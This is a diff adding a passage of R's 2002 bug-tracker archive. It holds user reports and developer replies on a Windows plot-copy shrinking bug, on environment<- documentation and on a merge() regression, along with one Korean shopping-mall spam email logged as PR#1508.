@@ -14709,3 +14709,873 @@ bgColor=#fbe6b6><FONT size=2><A
 href="http://www.marinedigital.com/en/mall/Inventory/index.asp?menu_code=InventorySaleView&amp;gubun=S6&amp;GoodsNo=S60422004"><B>GLAMOX</B><BR>MIX
 Z 67 U S P</A></FONT></TD>
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1507 *
+Subject: copy or save to metafile from graphics device shrinks plots
+From: drew.tyre@csiro.au
+Date: Fri, 3 May 2002 04:26:07 +0200 (MET DST)
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1507 <==
+From drew.tyre@csiro.au  Fri May  3 04:26:07 2002
+Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA09895
+	for <R-bugs@biostat.ku.dk>; Fri, 3 May 2002 04:26:07 +0200 (MET DST)
+Date: Fri, 3 May 2002 04:26:07 +0200 (MET DST)
+From: drew.tyre@csiro.au
+Message-Id: <200205030226.EAA09895@pubhealth.ku.dk>
+To: R-bugs@biostat.ku.dk
+Subject: copy or save to metafile from graphics device shrinks plots
+
+Full_Name: Drew Tyre
+Version: 1.4.0
+OS: Win 2000
+Submission from: (NULL) (140.253.74.225)
+
+
+When creating a rather complex plot, the resulting figures 'shrink' when either
+copied to the clipboard or saved as a metafile using the GUI menu. Also saving
+as postscript or pdf causes the same problem, as does printing the figure
+directly from the graphics window. Only the figure areas shrink, the contents
+appear to have the same size, leading to clipping around the edges. Saving as
+PNG format works, as does drawing directly to a win.metafile() device. I haven't
+tried bitmap format.
+
+The code is below; Aus() is an extension of oz() written by Nick Ellis - but
+doesn't seem to be related to the problem (ie. replacing that call with a simple
+plot() still creates the problem). I've tried to reproduce it with simpler plots
+for some hours to no avail. Bug 1242 seems like the only related one, but I'm
+not using lattice.grid. Given that there is a straightforward workaround
+(suggested by Nick Ellis) by writing directly to a metafile device it seems like
+a low priority. I'm happy to provide the data if anyone wants to look at it in
+detail. 
+         _              
+platform i386-pc-mingw32
+arch     x86            
+os       Win32          
+system   x86, Win32     
+status                  
+major    1              
+minor    4.0            
+year     2001           
+month    12             
+day      19             
+language R              
+
+[1] ".GlobalEnv"        "sulphuric.accepta" "package:MASS"     
+[4] "package:ctest"     "Autoloads"         "package:base"    
+
+
+#source("C:/Program Files/R/rw1040/library/Aus/source.q")
+#win.metafile("mapfigure.emf")
+par(mfrow=c(2,2),mar=c(5.1,4.1,0.1,0.1))
+Aus()
+hermit.hill <- list(x=136.8314,y=-30.02850)
+points(hermit.hill,pch="*",cex=2)
+mtext("A",side=2,cex=2,las=2,at=par("yaxp")[2])
+
+attach(sulphuric.accepta)
+plot(easting,northing,type="n",bty="n",
+axes=FALSE,xlab="",ylab="")
+filled <- occupied == 1
+points(easting[filled],northing[filled],
+pch=19,cex=log10(area[filled]))
+points(easting[!filled],northing[!filled],
+pch=21,cex=log10(area[!filled]))
+detach(2)
+
+plot.limits <- par(c("xaxp","yaxp"))
+segments(plot.limits$xaxp[1],plot.limits$yaxp[2],
+plot.limits$xaxp[1]+100,plot.limits$yaxp[2],lwd=3)
+text(x=plot.limits$xaxp[1]+50,y=plot.limits$yaxp[2]-5,adj=c(0.5,1),labels=c("100
+m"))
+
+mtext("B",side=2,cex=2,las=2,at=par("yaxp")[2])
+
+attach(sulphuric.isopods)
+plot(easting,northing,type="n",bty="n",
+axes=FALSE,xlab="",ylab="")
+filled <- occupied == 1
+points(easting[filled],northing[filled],
+pch=19,cex=log10(area[filled]))
+points(easting[!filled],northing[!filled],
+pch=21,cex=log10(area[!filled]))
+detach(2)
+
+plot.limits <- par(c("xaxp","yaxp"))
+segments(plot.limits$xaxp[1],plot.limits$yaxp[2],
+plot.limits$xaxp[1]+100,plot.limits$yaxp[2],lwd=3)
+text(x=plot.limits$xaxp[1]+50,y=plot.limits$yaxp[2]-5,adj=c(0.5,1),labels=c("100
+m"))
+
+mtext("C",side=2,cex=2,las=2,at=par("yaxp")[2])
+
+attach(bopeechee.zeidleri)
+plot(easting,northing,type="n",bty="n",
+axes=FALSE,xlab="",ylab="")
+filled <- occupied == 1
+points(easting[filled],northing[filled],
+pch=19,cex=log10(area[filled]))
+points(easting[!filled],northing[!filled],
+pch=21,cex=log10(area[!filled]))
+detach(2)
+
+plot.limits <- par(c("xaxp","yaxp"))
+segments(plot.limits$xaxp[1],plot.limits$yaxp[2],
+plot.limits$xaxp[1]+100,plot.limits$yaxp[2],lwd=3)
+text(x=plot.limits$xaxp[1]+50,y=plot.limits$yaxp[2]-5,adj=c(0.5,1),labels=c("100
+m"))
+
+mtext("D",side=2,cex=2,las=2,at=par("yaxp")[2])
+#dev.off()
+
+==> 1507.followup.1 <==
+From ripley@stats.ox.ac.uk  Fri May  3 08:52:42 2002
+Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA10577
+	for <R-bugs@biostat.ku.dk>; Fri, 3 May 2002 08:52:41 +0200 (MET DST)
+From: ripley@stats.ox.ac.uk
+Received: from gannet.stats (gannet.stats [163.1.20.127])
+	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id HAA24811;
+	Fri, 3 May 2002 07:51:57 +0100 (BST)
+Date: Fri, 3 May 2002 07:51:57 +0100 (BST)
+X-X-Sender:  <ripley@gannet.stats>
+To: <drew.tyre@csiro.au>
+cc: <R-bugs@biostat.ku.dk>
+Subject: Re: [Rd] copy or save  of plots (PR#1507)
+In-Reply-To: <200205030226.EAA09900@pubhealth.ku.dk>
+Message-ID: <Pine.LNX.4.31.0205030747090.10995-100000@gannet.stats>
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+
+On Fri, 3 May 2002 drew.tyre@csiro.au wrote:
+
+> Full_Name: Drew Tyre
+> Version: 1.4.0
+> OS: Win 2000
+> Submission from: (NULL) (140.253.74.225)
+>
+>
+> When creating a rather complex plot, the resulting figures 'shrink' when either
+> copied to the clipboard or saved as a metafile using the GUI menu. Also saving
+> as postscript or pdf causes the same problem, as does printing the figure
+> directly from the graphics window. Only the figure areas shrink, the contents
+
+That says the problem is in the replaying of graphics and not to do
+with metafiles.  (But I've shorten the subject for the sake of R-bugs.)
+
+1.4.0 was the first version with new graphics drivers, and we would
+first need to know if this is still present in 1.5.0, and also if specific
+to Windows.  Could you test 1.5.0 once that becomes available, and let us
+know?  If the problem is still present, it would help if we had a complete
+reproducible example on a web site somewhere.
+
+-- 
+Brian D. Ripley,                  ripley@stats.ox.ac.uk
+Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
+University of Oxford,             Tel:  +44 1865 272861 (self)
+1 South Parks Road,                     +44 1865 272860 (secr)
+Oxford OX1 3TG, UK                Fax:  +44 1865 272595
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1508 *
+Subject: �??醍� ?�??도 �?�?데 5???� ????????.....................................................[광�?]    
+From: ?????�<cessil2@dreamwiz.com>
+Date: Fri, 03 May 2002 17:08:26 -0600
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1508 <==
+From cessil2@dreamwiz.com  Fri May  3 10:06:35 2002
+Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA11392
+	for <R-bugs@biostat.ku.dk>; Fri, 3 May 2002 10:06:34 +0200 (MET DST)
+Received: (from daemon@localhost)
+	by stat.math.ethz.ch (8.9.1/8.9.1) id KAA21757
+	for <r-bugs@lists.r-project.org>; Fri, 3 May 2002 10:05:49 +0200 (MET DST)
+Message-Id: <200205030805.KAA21757@stat.math.ethz.ch>
+Received: from UNKNOWN(211.108.42.84), claiming to be "dreamwiz.com"
+ via SMTP by hypatia, id smtpdAAAa005Hg; Fri May  3 10:05:42 2002
+To: <r-bugs@hypatia.math.ethz.ch>
+From: ?????�<cessil2@dreamwiz.com>
+Subject: �??醍� ?�??도 �?�?데 5???� ????????.....................................................[광�?]    
+Date: Fri, 03 May 2002 17:08:26 -0600
+Content-Type: text/html; charset="ks_c_5601-1987"
+X-Mailer: JBH Msender v 1.0
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
+
+
+<html>
+
+<head>
+<title></title>
+</head>
+
+<body>
+<center> 
+
+귀하의 메일주소는 웹서핑 중에서 알게 된것이며, E-Mail 주소 외에, 다른 정보는 갖고 
+있지 않습니다.<BR>정통부 권고사항에 의거 제목에 [광고]라고 표기한 메일입니다. 원치 않으면 아래의 수신거부를 
+
+눌러주세요
+<table cellSpacing='0' cellPadding='0' width='400' border='0'>
+  <tbody>
+    <tr>
+      <td colSpan='2'><IMG height=70 src="http://allforshop.imart.ac/images/mall_4pop1.gif" width=400></td>
+    </tr>
+    <tr>
+      <td colSpan='2'><IMG height=61 src="http://allforshop.imart.ac/images/mall_4pop2.gif" width=400></td>
+    </tr>
+    <tr>
+      <td colSpan='2'><IMG height=56 src="http://allforshop.imart.ac/images/mall_4pop3.gif" width=400 useMap=#Map border=0></td>
+    </tr>
+    <tr>
+      <td><A target=new href="http://allforshop.imart.ac/event_1nectar.asp"><IMG height=240 src="http://allforshop.imart.ac/images/mall_4pop4.gif" width=197 border=0></A></td>
+      <td><A target=new href="http://allforshop.imart.ac/event_bashi.asp"><IMG height=240 src="http://allforshop.imart.ac/images/mall_4pop5.gif" width=203 border=0></A></td>
+    </tr>
+    <tr>
+      <td colSpan='2'><A target=new href="http://allforshop.imart.ac/event_thai.asp"><IMG height=74 src="http://allforshop.imart.ac/images/mall_4pop6.gif" width=400 border=0></A></td>
+    </tr>
+    <tr align='middle' bgColor='#f6ecf6'>
+      <td colSpan='2' height='25'>
+        
+      </td>
+    </tr>
+  </tbody>
+</table>
+<map name='Map'>
+<area shape='RECT' coords='11,1,95,56' href="http://allforshop.imart.ac/event_famo.asp" target=new>
+<area shape='RECT' coords='98,1,175,62' href="http://allforshop.imart.ac/event_famo1.asp" target=new>
+<area shape='RECT' coords='179,2,260,55' href="http://allforshop.imart.ac/event_famo1.asp" target=new></map>
+<A href="mailto:cessil2@dreamwiz.com?subject=수신거부">수신거부</A>&nbsp;&nbsp;&nbsp;<a href="http://www.allforshop.net" target=new>Allforshop 쇼핑몰로 바로가기</a>
+</center>
+</body>
+
+</html>
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1509 *
+Subject:  Behaviour of environment(foo)<- 
+From: J.C.Rougier@durham.ac.uk
+Date: Fri, 3 May 2002 11:10:21 +0100
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1509 <==
+From postmaster@franz.stat.wisc.edu  Fri May  3 12:12:11 2002
+Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA13480
+	for <r-bugs@biostat.ku.dk>; Fri, 3 May 2002 12:12:11 +0200 (MET DST)
+Received: from hermes.dur.ac.uk (really [129.234.4.9]) by franz.stat.wisc.edu
+	via smail with esmtp
+	id <m173a1Z-000IcUC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
+	for <r-bugs@r-project.org>; Fri, 3 May 2002 05:10:49 -0500 (CDT) 
+Received: from euclid (euclid.dur.ac.uk [129.234.21.53])
+	by hermes.dur.ac.uk (8.11.1/8.11.1) with ESMTP id g43AAMc04908
+	for <r-bugs@r-project.org>; Fri, 3 May 2002 11:10:22 +0100 (BST)
+Received: from arrow.dur.ac.uk by euclid id <g43AALr28155@euclid>; Fri, 3 May 2002 11:10:21 +0100 (BST)
+From: J.C.Rougier@durham.ac.uk
+Date: Fri, 3 May 2002 11:10:21 +0100
+Message-Id: <7188.200205031010@arrow.dur.ac.uk>
+To: r-bugs@r-project.org
+Subject:  Behaviour of environment(foo)<- 
+Cc: dma0jcr@arrow.dur.ac.uk
+X-MailScanner: Found to be clean
+
+Hi Everyone, 
+
+I've noticed that setting the environment of a function from a package
+actually creates a copy of that function in .GlobalEnv and sets the
+environment on this copy:
+
+> find(.profile)
+[1] "package:newblips"
+> environment(.profile) <- bb1$getEnv() # this is an environment
+> find(.profile)
+[1] ".GlobalEnv"       "package:newblips"
+
+I don't have a problem with this behaviour (now I understand it!) but
+I think that it would help to document it in the help file.  May I
+suggest that instead of
+
+     The assignment form sets the environment of the function or
+     formula `fun' to the `value' given.
+
+we have
+
+     The assignment form sets the environment of the function or
+     formula \code{fun} to \code{value} if \code{fun} is in the
+     current environment, otherwise it makes a copy of \code{fun} in
+     the current environment and sets the environment of the copy.
+
+I think that describes the current procedure: please correct me if I
+am wrong!
+
+Cheers, Jonathan.
+
+--please do not edit the information below--
+
+Version:
+ platform = i686-pc-linux-gnu
+ arch = i686
+ os = linux-gnu
+ system = i686, linux-gnu
+ status = 
+ major = 1
+ minor = 5.0
+ year = 2002
+ month = 04
+ day = 29
+ language = R
+
+Search Path:
+ .GlobalEnv, package:newblips, package:MASS, package:mva, Autoloads, package:base
+
+==> 1509.reply.1 <==
+From p.dalgaard@biostat.ku.dk  Fri May  3 12:29:04 2002
+Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA13794;
+	Fri, 3 May 2002 12:29:03 +0200 (MET DST)
+Received: (from pd@localhost)
+	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g43AQwl15037;
+	Fri, 3 May 2002 12:26:58 +0200
+X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
+Sender: pd@pubhealth.ku.dk
+To: J.C.Rougier@durham.ac.uk
+Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
+Subject: Re: [Rd] Behaviour of environment(foo)<- (PR#1509)
+References: <200205031012.MAA13485@pubhealth.ku.dk>
+From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
+Date: 03 May 2002 12:26:58 +0200
+In-Reply-To: <200205031012.MAA13485@pubhealth.ku.dk>
+Message-ID: <x26625y1al.fsf@blueberry.kubism.ku.dk>
+Lines: 44
+User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+
+J.C.Rougier@durham.ac.uk writes:
+
+> Hi Everyone, 
+> 
+> I've noticed that setting the environment of a function from a package
+> actually creates a copy of that function in .GlobalEnv and sets the
+> environment on this copy:
+> 
+> > find(.profile)
+> [1] "package:newblips"
+> > environment(.profile) <- bb1$getEnv() # this is an environment
+> > find(.profile)
+> [1] ".GlobalEnv"       "package:newblips"
+> 
+> I don't have a problem with this behaviour (now I understand it!) but
+> I think that it would help to document it in the help file.  May I
+> suggest that instead of
+> 
+>      The assignment form sets the environment of the function or
+>      formula `fun' to the `value' given.
+> 
+> we have
+> 
+>      The assignment form sets the environment of the function or
+>      formula \code{fun} to \code{value} if \code{fun} is in the
+>      current environment, otherwise it makes a copy of \code{fun} in
+>      the current environment and sets the environment of the copy.
+> 
+> I think that describes the current procedure: please correct me if I
+> am wrong!
+
+But this is generic behaviour for *all* attribute assignment. It makes
+no sense to describe a specific instance of it. Consider
+
+data(airquality)
+f<-function() { x <- class(airquality)<-NULL; ls() }
+f()
+class(airquality)
+
+-- 
+   O__  ---- Peter Dalgaard             Blegdamsvej 3  
+  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
+ (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
+~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
+
+==> 1509.followup.1 <==
+From J.C.Rougier@durham.ac.uk  Fri May  3 12:50:54 2002
+Received: from hermes.dur.ac.uk (hermes.dur.ac.uk [129.234.4.9])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA14153;
+	Fri, 3 May 2002 12:50:54 +0200 (MET DST)
+Received: from euclid (euclid.dur.ac.uk [129.234.21.53])
+	by hermes.dur.ac.uk (8.11.1/8.11.1) with ESMTP id g43AnQc09907;
+	Fri, 3 May 2002 11:49:26 +0100 (BST)
+Received: from durham.ac.uk by euclid id <g43AnPr29622@euclid>; Fri, 3 May 2002 11:49:25 +0100 (BST)
+Sender: dma0jcr@durham.ac.uk
+Message-ID: <3CD26B35.1F72FD86@durham.ac.uk>
+Date: Fri, 03 May 2002 11:49:25 +0100
+From: Jonathan Rougier <J.C.Rougier@durham.ac.uk>
+Organization: Maths Dept., Univ. of Durham
+X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.9-21 i686)
+X-Accept-Language: en
+MIME-Version: 1.0
+To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
+CC: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
+Subject: Re: [Rd] Behaviour of environment(foo)<- (PR#1509)
+References: <200205031012.MAA13485@pubhealth.ku.dk> <x26625y1al.fsf@blueberry.kubism.ku.dk>
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+X-MailScanner: Found to be clean
+
+Peter Dalgaard BSA wrote:
+> 
+> J.C.Rougier@durham.ac.uk writes:
+> 
+> > Hi Everyone,
+> >
+> > I've noticed that setting the environment of a function from a package
+> > actually creates a copy of that function in .GlobalEnv and sets the
+> > environment on this copy:
+> >
+> > > find(.profile)
+> > [1] "package:newblips"
+> > > environment(.profile) <- bb1$getEnv() # this is an environment
+> > > find(.profile)
+> > [1] ".GlobalEnv"       "package:newblips"
+> >
+> > I don't have a problem with this behaviour (now I understand it!) but
+> > I think that it would help to document it in the help file.  May I
+> > suggest that instead of
+> >
+> >      The assignment form sets the environment of the function or
+> >      formula `fun' to the `value' given.
+> >
+> > we have
+> >
+> >      The assignment form sets the environment of the function or
+> >      formula \code{fun} to \code{value} if \code{fun} is in the
+> >      current environment, otherwise it makes a copy of \code{fun} in
+> >      the current environment and sets the environment of the copy.
+> >
+> > I think that describes the current procedure: please correct me if I
+> > am wrong!
+> 
+> But this is generic behaviour for *all* attribute assignment. It makes
+> no sense to describe a specific instance of it. Consider
+> 
+> data(airquality)
+> f<-function() { x <- class(airquality)<-NULL; ls() }
+> f()
+> class(airquality)
+
+I understand.  However, I still think that the help page for environment
+is wrong!  Using "enviroment<-" does not necessarily set the environment
+of the function, as stated.  What happened to me is that I modified
+.profile in the package newblips and then re-assigned its environment
+but didn't see any change, because it was masked by the copy of .profile
+in .GlobalEnv that I didn't know I had.  That's quite a subtle outcome
+and I think that changing the environment help page would clarify this
+for other users.  J.
+
+-- 
+Jonathan Rougier                       Science Laboratories
+Department of Mathematical Sciences    South Road
+University of Durham                   Durham DH1 3LE
+tel: +44 (0)191 374 2361, fax: +44 (0)191 374 7388
+http://www.maths.dur.ac.uk/stats/people/jcr/jcr.html
+
+==> 1509.reply.2 <==
+From luke@nokomis.stat.umn.edu  Fri May  3 16:27:26 2002
+Received: from nokomis.stat.umn.edu (nokomis.stat.umn.edu [134.84.86.39])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA16777;
+	Fri, 3 May 2002 16:27:25 +0200 (MET DST)
+Received: (from luke@localhost)
+	by nokomis.stat.umn.edu (8.11.6/8.11.6/SuSE Linux 0.5) id g43EQXv12005;
+	Fri, 3 May 2002 09:26:33 -0500
+Date: Fri, 3 May 2002 09:26:33 -0500
+From: Luke Tierney <luke@stat.umn.edu>
+To: Jonathan Rougier <J.C.Rougier@durham.ac.uk>
+Cc: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>, r-devel@stat.math.ethz.ch,
+        R-bugs@biostat.ku.dk
+Subject: Re: [Rd] Behaviour of environment(foo)<- (PR#1509)
+Message-ID: <20020503092633.A11402@nokomis.stat.umn.edu>
+References: <200205031012.MAA13485@pubhealth.ku.dk> <x26625y1al.fsf@blueberry.kubism.ku.dk> <3CD26B35.1F72FD86@durham.ac.uk>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+User-Agent: Mutt/1.2.5i
+In-Reply-To: <3CD26B35.1F72FD86@durham.ac.uk>; from J.C.Rougier@durham.ac.uk on Fri, May 03, 2002 at 11:49:25AM +0100
+
+On Fri, May 03, 2002 at 11:49:25AM +0100, Jonathan Rougier wrote:
+> Peter Dalgaard BSA wrote:
+> > 
+> > J.C.Rougier@durham.ac.uk writes:
+> > 
+> > > Hi Everyone,
+> > >
+> > > I've noticed that setting the environment of a function from a package
+> > > actually creates a copy of that function in .GlobalEnv and sets the
+> > > environment on this copy:
+> > >
+> > > > find(.profile)
+> > > [1] "package:newblips"
+> > > > environment(.profile) <- bb1$getEnv() # this is an environment
+> > > > find(.profile)
+> > > [1] ".GlobalEnv"       "package:newblips"
+> > >
+> > > I don't have a problem with this behaviour (now I understand it!) but
+> > > I think that it would help to document it in the help file.  May I
+> > > suggest that instead of
+> > >
+> > >      The assignment form sets the environment of the function or
+> > >      formula `fun' to the `value' given.
+> > >
+> > > we have
+> > >
+> > >      The assignment form sets the environment of the function or
+> > >      formula \code{fun} to \code{value} if \code{fun} is in the
+> > >      current environment, otherwise it makes a copy of \code{fun} in
+> > >      the current environment and sets the environment of the copy.
+> > >
+> > > I think that describes the current procedure: please correct me if I
+> > > am wrong!
+> > 
+> > But this is generic behaviour for *all* attribute assignment. It makes
+> > no sense to describe a specific instance of it. Consider
+> > 
+> > data(airquality)
+> > f<-function() { x <- class(airquality)<-NULL; ls() }
+> > f()
+> > class(airquality)
+> 
+> I understand.  However, I still think that the help page for environment
+> is wrong!  Using "enviroment<-" does not necessarily set the environment
+> of the function, as stated.  What happened to me is that I modified
+> .profile in the package newblips and then re-assigned its environment
+> but didn't see any change, because it was masked by the copy of .profile
+> in .GlobalEnv that I didn't know I had.  That's quite a subtle outcome
+> and I think that changing the environment help page would clarify this
+> for other users.  J.
+
+I agree with Peter.  The compound assignment process is quite complex
+but it is uniform across compound assignments.  One way to describe it
+is that
+
+	f(x)<- y
+
+does roughly (modulo some performance tweaks)
+
+	if (! exists("x", inherits = FALSE))
+            x <- x  # insures x is local
+        x <- "f<-"(x, value = y)
+
+The shorthand used in ?"environment<-" is the same as the shorthand
+used in at lest some other assignment contexts, for example in ?"[<-":
+
+     If one of these expressions appears on the left side of an
+     assignment then that part of `x' is set to the value of the right
+     hand side of the assignment.
+
+I don't see much point in adding a substantial amount of legalese to
+all of these, and doing so in only some places is likely to lead to
+more confusion.
+
+Specific to environment<-, if any change is warranted is might be to
+add a disclaimer like
+
+	Changing the environment of a function can have unexpected
+	consequences.  There is usually a safer way to achieve what
+	you are trying to do.
+
+A similar warning would be appropriate for formals<- and body<-.  When
+you define a function the usual way you cause a function expression
+consisting of formals and body to be evaluated in a particular
+environment.  That creates a closure in which the three pieces are
+assembled in a consistent fashion.  Assigning to any one of them
+separately is quite likely to lead to inconsistencies and is one
+reason the internal code loses all attributes on the function when you
+do this (in particular the 'source' attribute if there was one).  If
+we get byte code compilation and f is a compiled function, then after
+
+	environment(f)<- myenv
+
+the value of f will have to either be an interpreted function or the
+assignment will have to trigger a new compilation since the original
+compilation will have used information from the original environment.
+
+In fact, given these issues I would argue that a pretty strong case
+can be made for eliminating formals<-, body<- and environment<- (at
+least for functions), though there are some very limited circumstances
+where they can be useful if used with care.
+
+So, after all that, the real question: why are you doing this and are
+you sure there isn't a better way?
+
+luke
+
+-- 
+Luke Tierney
+University of Minnesota                      Phone:           612-625-7843
+School of Statistics                         Fax:             612-624-8868
+313 Ford Hall, 224 Church St. S.E.           email:      luke@stat.umn.edu
+Minneapolis, MN 55455 USA                    WWW:  http://www.stat.umn.edu
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1510 *
+Subject: merge
+From: elff@rumms.uni-mannheim.de
+Date: Fri, 3 May 2002 16:42:29 +0200 (MET DST)
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1510 <==
+From elff@rumms.uni-mannheim.de  Fri May  3 16:42:29 2002
+Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA16923
+	for <R-bugs@biostat.ku.dk>; Fri, 3 May 2002 16:42:29 +0200 (MET DST)
+Date: Fri, 3 May 2002 16:42:29 +0200 (MET DST)
+From: elff@rumms.uni-mannheim.de
+Message-Id: <200205031442.QAA16923@pubhealth.ku.dk>
+To: R-bugs@biostat.ku.dk
+Subject: merge
+
+Full_Name: Martin Elff
+Version: 1.5.0
+OS: MS Windows 98
+Submission from: (NULL) (134.155.91.46)
+
+
+Merging of two data frames by variables with different names 
+(using by.x and by.y) is no 
+longer possible (it was possible in version 1.4.1). 
+Call:
+
+mvoteint.classd.matadd <- merge(
+                            unique(mvoteint.classd),
+                            unique(subset(dimens.mpp,
+                                select=c(nation,year,mecode,
+                                        econlrdiff,
+                                        eeconlrdiff,
+                                        welfdiff,
+                                        labmiddiff,
+                                        authlibdiff,
+                                        authlibdiffn)
+                            )),
+                            by.x=c("nation","eyear","mvoteint"),
+                            by.y=c("nation","year","mecode"),
+                            all.x=TRUE,
+                            sort=TRUE
+                            )
+
+Error message:
+Error in match.names(clabs, names(xi)) : names don't match previous names:
+         year, mecode
+
+
+Traceback:
+
+10: stop(paste("names don't match previous names:\n     ", paste(nmi[nii == 
+        0], collapse = ", ")))
+9: match.names(clabs, names(xi))
+8: rbind(...)
+7: rbind(x[, by.x], y[, by.y])
+6: do.call("paste", c(rbind(x[, by.x], y[, by.y]), sep = "\r"))
+5: merge.data.frame(unique(mvoteint.classd), unique(subset(dimens.mpp, 
+       select = c(nation, year, mecode, econlrdiff, eeconlrdiff, 
+           welfdiff, labmiddiff, authlibdiff, authlibdiffn))), by.x =
+c("nation", 
+       "eyear", "mvoteint"), by.y = c("nation", "year", "mecode"), 
+       all.x = TRUE, sort = TRUE)
+4: merge(unique(mvoteint.classd), unique(subset(dimens.mpp, select = c(nation, 
+       year, mecode, econlrdiff, eeconlrdiff, welfdiff, labmiddiff, 
+       authlibdiff, authlibdiffn))), by.x = c("nation", "eyear", 
+       "mvoteint"), by.y = c("nation", "year", "mecode"), all.x = TRUE, 
+       sort = TRUE)
+3: eval.with.vis(expr, envir, enclos)
+2: eval.with.vis(ei, envir)
+1: source("setup-classd-mat-additiv.R", echo = T)
+
+
+==> 1510.followup.1 <==
+From tlumley@u.washington.edu  Fri May  3 18:07:07 2002
+Received: from mxout2.cac.washington.edu (mxout2.cac.washington.edu [140.142.33.4])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA17379
+	for <R-bugs@biostat.ku.dk>; Fri, 3 May 2002 18:07:06 +0200 (MET DST)
+Received: from mailscan-out1.cac.washington.edu (mailscan-out1.cac.washington.edu [140.142.32.17])
+	by mxout2.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with SMTP id g43G6Pah020897
+	for <R-bugs@biostat.ku.dk>; Fri, 3 May 2002 09:06:25 -0700
+Received: FROM homer39.u.washington.edu BY mailscan-out1.cac.washington.edu ; Fri May 03 09:06:14 2002 -0700
+Received: from localhost (tlumley@localhost)
+	by homer39.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g43G6EST090242;
+	Fri, 3 May 2002 09:06:14 -0700
+Date: Fri, 3 May 2002 09:06:14 -0700 (PDT)
+From: Thomas Lumley <tlumley@u.washington.edu>
+To: elff@rumms.uni-mannheim.de
+cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
+Subject: Re: [Rd] merge (PR#1510)
+In-Reply-To: <200205031442.QAA16928@pubhealth.ku.dk>
+Message-ID: <Pine.A41.4.44.0205030859300.100836-100000@homer39.u.washington.edu>
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+
+On Fri, 3 May 2002 elff@rumms.uni-mannheim.de wrote:
+
+> Full_Name: Martin Elff
+> Version: 1.5.0
+> OS: MS Windows 98
+> Submission from: (NULL) (134.155.91.46)
+>
+>
+> Merging of two data frames by variables with different names
+> (using by.x and by.y) is no
+> longer possible (it was possible in version 1.4.1).
+
+To be precise, it doesn't seem to work with multiple by columns, so
+> df<-data.frame(x=1:10,y=rnorm(10))
+> fd<-data.frame(z=1:10,w=rnorm(10))
+> merge(df,fd,by.x="x",by.y="z")
+succeeds but
+> fd<-data.frame(z=1:10,m=letters[1:10],w=rnorm(10))
+> df<-data.frame(x=1:10,y=rnorm(10),n=letters[1:10])
+> merge(df,fd,by.x=c("x","n"),by.y=c("z","m"))
+Error in match.names(clabs, names(xi)) : names don't match previous names:
+         z, m
+
+
+	-thomas
+
+
+==> 1510.followup.2 <==
+From ripley@stats.ox.ac.uk  Fri May  3 18:16:27 2002
+Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA17453
+	for <R-bugs@biostat.ku.dk>; Fri, 3 May 2002 18:16:26 +0200 (MET DST)
+From: ripley@stats.ox.ac.uk
+Received: from gannet.stats (gannet.stats [163.1.20.127])
+	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id RAA26106;
+	Fri, 3 May 2002 17:15:44 +0100 (BST)
+Date: Fri, 3 May 2002 17:15:44 +0100 (BST)
+X-X-Sender:  <ripley@gannet.stats>
+To: Thomas Lumley <tlumley@u.washington.edu>
